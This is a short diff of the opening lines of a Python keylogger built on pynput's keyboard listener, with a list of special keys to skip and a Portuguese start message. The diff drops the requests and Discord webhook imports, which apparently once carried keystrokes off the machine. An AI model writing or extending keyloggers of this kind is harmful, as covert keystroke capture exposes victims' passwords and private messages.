@@ -1,8 +1,7 @@
 #!/bin/python3
 
 from pynput.keyboard import Listener
-import re, requests
-from discord import Webhook, RequestsWebhookAdapter
+import re
 
 keys = []; ksksks = ['Key.right', 'Key.down', 'Key.left', 'Key.esc', 'Key.caps_lock', 'Key.alt', 'Key.up', 'Key.ctrl', 'Key.shift', 'Key.tab']
 print('Captura de teclas iniciada!')
